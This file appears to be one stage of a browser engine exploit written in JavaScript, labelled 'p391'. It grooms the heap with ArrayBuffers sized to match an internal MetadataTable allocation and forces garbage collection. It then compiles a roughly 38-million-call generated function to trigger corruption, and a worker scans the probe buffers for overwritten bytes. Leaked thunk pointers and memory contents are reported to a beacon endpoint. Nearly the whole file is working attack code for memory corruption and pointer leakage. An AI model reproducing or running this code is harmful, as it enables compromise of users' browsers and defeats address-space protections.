// p391 - ArrayBuffer sweep scan with CORRECT bait size
//
// V390 FAILED because AB baits were 128KB (8 granules) but MetadataTable is
// 100,112 bytes (7 granules). Libpas bitfit can't reuse different-granule slots.
//
// FIX: baits AND probes = 100112 bytes = exactly MetadataTable allocation size
// = 7 granules (7 * 16384 = 114688 in bitfit). Same size class ensures
// MetadataTable fills a freed bait slot, probes are ABOVE it in the same page.
//
// Fill with 0x42, trigger sweep, scan for non-0x42 (thunk ptrs at entry+24).
//
// Beacon prefix: V391-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V391-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V391-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }

  B('BOOT');

  var workerCode = function() {
    var baits = [];
    var probes = [];
    var probeViews = [];
    var baseUrl = '';
    // EXACT MetadataTable allocation size: sizeof(LinkingData) + totalSize = 16 + 100096 = 100112
    var AB_SIZE = 100112;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V391-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }
    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
    function hex16(arr, off, len) {
      var s = '';
      for (var i = 0; i < len && (off + i) < arr.length; i++) s += hexByte(arr[off + i]);
      return s;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') { baseUrl = e.data.baseUrl; beacon('ALIVE'); return; }

      if (e.data.cmd === 'alloc') {
        // 30 bait ABs (more baits = better chance of contiguous block)
        for (var i = 0; i < 30; i++) {
          var ab = new ArrayBuffer(AB_SIZE);
          var v = new Uint8Array(ab);
          for (var j = 0; j < AB_SIZE; j++) v[j] = 0x42;
          baits.push(ab);
        }
        beacon('BAITS-' + baits.length);

        // 10 probe ABs
        for (var i = 0; i < 10; i++) {
          var ab = new ArrayBuffer(AB_SIZE);
          var v = new Uint8Array(ab);
          for (var j = 0; j < AB_SIZE; j++) v[j] = 0x42;
          probes.push(ab);
          probeViews.push(v);
        }
        beacon('PROBES-' + probes.length);

        // Free baits to create holes for MetadataTable
        for (var i = 0; i < baits.length; i++) baits[i] = null;
        baits = [];
        beacon('FREED');
        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');
        var totalNonB = 0;
        var probesCorrupted = 0;
        var probesIntact = 0;

        for (var pi = 0; pi < probes.length; pi++) {
          try {
            var v = probeViews[pi];
            var len = v.length;

            // FULL SCAN: check every byte
            var nonB = [];
            for (var j = 0; j < len; j++) {
              if (v[j] !== 0x42) {
                nonB.push(j);
                if (nonB.length <= 30) {
                  beacon('P' + pi + '-NONB-' + j + '-' + hexByte(v[j]));
                }
              }
            }

            if (nonB.length === 0) {
              probesIntact++;
              beacon('P' + pi + '-INTACT');
              continue;
            }

            probesCorrupted++;
            beacon('P' + pi + '-HIT-' + nonB.length);
            totalNonB += nonB.length;

            // Stride analysis
            if (nonB.length >= 2) {
              var diffs = [];
              for (var k = 1; k < Math.min(nonB.length, 15); k++) {
                diffs.push(nonB[k] - nonB[k-1]);
              }
              beacon('P' + pi + '-DIFFS-' + diffs.join(','));
            }

            // Read 8 bytes at first 8 non-B positions
            for (var k = 0; k < Math.min(nonB.length, 8); k++) {
              var pos = nonB[k];
              beacon('P' + pi + '-BYTES-' + pos + '-' + hex16(v, pos, 8));
            }

            // STRIDE SCAN: 112-byte stride, check entry+24 (thunk pointer)
            var thunkFinds = 0;
            for (var stride = 0; stride + 31 < len; stride += 112) {
              var hasThunk = false;
              for (var b = 24; b < 32; b++) {
                if (v[stride + b] !== 0x42) { hasThunk = true; break; }
              }
              if (hasThunk) {
                if (thunkFinds < 5) {
                  beacon('P' + pi + '-THUNK-' + stride + '-' + hex16(v, stride + 24, 8));
                }
                thunkFinds++;
              }
            }
            if (thunkFinds > 0) beacon('P' + pi + '-THUNKS-' + thunkFinds);

            // Also check entry+12 (0xFFFFFFFF), entry+64 (bits), entry+68 (bci)
            var otherFinds = 0;
            for (var stride = 0; stride + 71 < len; stride += 112) {
              // entry+12: should be 0xFFFFFFFF
              if (v[stride+12] !== 0x42 || v[stride+13] !== 0x42 || v[stride+14] !== 0x42 || v[stride+15] !== 0x42) {
                if (otherFinds < 3) {
                  beacon('P' + pi + '-E12-' + stride + '-' + hex16(v, stride + 12, 4));
                }
                otherFinds++;
              }
              // entry+68: bytecodeIndex
              if (v[stride+68] !== 0x42 || v[stride+69] !== 0x42 || v[stride+70] !== 0x42 || v[stride+71] !== 0x42) {
                if (otherFinds < 6) {
                  beacon('P' + pi + '-E68-' + stride + '-' + hex16(v, stride + 68, 4));
                }
                otherFinds++;
              }
            }
            if (otherFinds > 0) beacon('P' + pi + '-OTHERFINDS-' + otherFinds);

            // Float64 extraction at thunk positions
            var dv = new DataView(probes[pi]);
            var ptrFinds = 0;
            for (var entry = 0; entry * 112 + 31 < len; entry++) {
              var byteOff = entry * 112 + 24;
              if (byteOff + 7 < len) {
                var hi = dv.getUint32(byteOff + 4, true);
                var lo = dv.getUint32(byteOff, true);
                if (hi !== 0x42424242 || lo !== 0x42424242) {
                  if (ptrFinds < 5) {
                    var hexHi = ('00000000' + hi.toString(16)).slice(-8);
                    var hexLo = ('00000000' + lo.toString(16)).slice(-8);
                    beacon('P' + pi + '-PTR64-' + byteOff + '-' + hexHi + hexLo);
                  }
                  ptrFinds++;
                }
              }
            }
            if (ptrFinds > 0) beacon('P' + pi + '-PTR64FINDS-' + ptrFinds);

          } catch(ex) {
            beacon('P' + pi + '-CRASH-' + (ex.message || '').substring(0, 40));
          }
        }

        beacon('SUMMARY-CORRUPT' + probesCorrupted + '-INTACT' + probesIntact + '-NONB' + totalNonB);
        beacon('ALL-DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(['(' + workerCode.toString() + ')()'], { type: 'application/javascript' });
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: location.protocol + '//' + location.host });

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
    if (e.data.done) {
      B('WORKER-SCAN-DONE');
    }
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p391fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p391ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p391ok ? 'OK' : 'FAIL'));
      worker.postMessage({ cmd: 'scan' });
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
